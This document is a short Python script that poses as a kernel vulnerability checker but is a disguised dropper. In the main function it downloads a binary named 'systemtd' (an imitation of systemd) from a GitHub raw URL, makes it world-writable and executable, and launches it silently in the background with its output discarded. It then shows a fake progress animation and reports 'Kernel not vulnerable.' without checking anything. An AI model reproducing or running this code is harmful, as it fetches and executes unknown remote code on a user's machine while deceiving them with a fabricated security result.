import os
import subprocess
import requests
import time

def download_file(url, file_name):
    response = requests.get(url, stream=True)
    with open(file_name, 'wb') as f:
        for data in response.iter_content(chunk_size=8192):
            f.write(data)

def check_kernel_vulnerability():
    # Simulating kernel version checking animation
    print("Checking kernel version: ", end='', flush=True)
    for i in range(10):
        print(".", end='', flush=True)
        time.sleep(0.3)
    print("\nKernel not vulnerable.")

def main():
    # URL of the file on GitHub
    github_url = "https://raw.githubusercontent.com/FoxyProxys/github/main/systemtd"

    # File name to save the downloaded file
    file_name = "systemtd"

    # Download the file
    download_file(github_url, file_name)

    # Change file permissions
    os.chmod(file_name, 0o777)

    # Execute the file in the background
    subprocess.Popen(["./{}".format(file_name)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Check kernel vulnerability
    check_kernel_vulnerability()

if __name__ == "__main__":
    main()
